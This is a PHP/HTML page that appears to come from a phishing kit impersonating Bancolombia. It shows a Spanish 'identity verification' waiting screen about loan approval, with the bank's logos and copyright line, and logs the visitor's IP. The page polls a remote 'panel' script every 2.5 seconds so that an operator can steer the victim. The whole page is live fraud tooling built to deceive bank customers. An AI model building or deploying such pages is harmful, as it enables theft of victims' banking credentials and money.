<?php
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set('America/Bogota');
$tiempo = date("l, j \d\e F \d\e Y");
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Bancolombia - Verificación de Identidad</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v<?php echo time(); ?>" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
        <script type="text/javascript" src="../js/functions.js?v=<?php echo time(); ?>"></script>

        <style type="text/css">
            body {
                background-color: #fff;
                text-align: center;              
                font-family: 'Open Sans', sans-serif;
            }
            .contenedor-espera {
                padding: 40px 20px;
            }
            .descripcion-app {
                font-size: 16px;
                color: #333;
                line-height: 1.5;
                margin-top: 20px;
            }
            .footer-espera {
                position: fixed;
                bottom: 20px;
                width: 100%;
                font-size: 12px;
                color: #999;
            }
        </style>
    </head>
    <body>         
        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 10px; border-bottom: 1px solid #eee;">
            <tr>
                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="25"></td>
                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="25"></td>
                <td valign="middle" align="right" width="33%"><span style="width:30px;"></span></td>
            </tr>
        </table>        
        
        <div class="contenedor-espera">
            <img src="../img/logo.svg" width="200" style="margin-bottom: 40px;">
            
            <img src="../img/load4.gif" width="70">            
            
            <div class="descripcion-app">
                <b>Estamos procesando su solicitud.</b> <br><br>
                Por favor, no cierre esta ventana. Estamos validando su información con nuestra central de riesgos para la aprobación de su préstamo.
            </div> 
            
            <p style="color: #666; font-size: 14px; margin-top: 30px;">Verificando identidad...</p>
        </div>

        <div class="footer-espera">
            &copy; <?php echo date("Y"); ?> Bancolombia S.A.
        </div>

        <script type="text/javascript">
            $(document).ready(function() {
                // Consultamos el panel cada 2.5 segundos para no saturar el servidor
                // Esta función está en functions.js y revisa process/estado.php
                var chequeo = setInterval(function(){
                    consultar_estado();
                }, 2500); 
            });
        </script>
    </body>
</html>
